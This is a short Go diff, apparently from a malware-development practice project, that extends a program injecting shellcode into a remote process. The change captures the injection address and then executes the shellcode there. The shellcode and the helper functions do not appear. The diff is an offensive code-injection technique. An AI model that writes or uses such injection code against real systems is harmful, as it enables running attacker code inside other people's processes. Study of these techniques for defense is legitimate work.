@@ -25,8 +25,14 @@ func main() {
 	maldev.DebugWait("Inject")
 	maldev.Debugf("Injecting shellcode of length %d bytes\n", len(sc))
 	shellcode.Print("Shellcode", 0, sc)
-	err = maldev.InjectShellcodeToRemoteProcess(hProcess, sc, len(sc))
+	pAddress, err := maldev.InjectShellcodeToRemoteProcess(hProcess, sc, len(sc))
 	if err != nil {
 		log.Fatalf("Failed to inject shellcode: %s\n", err)
 	}
+	maldev.Debugf("Shellcode injected at 0x%X\n", pAddress)
+	err = maldev.RunShellcodeToRemoteProcess(hProcess, maldev.LPVOID(pAddress))
+	if err != nil {
+		log.Fatalf("Failed to run shellcode: %s\n", err)
+	}
+	maldev.DebugWait("Done")
 }
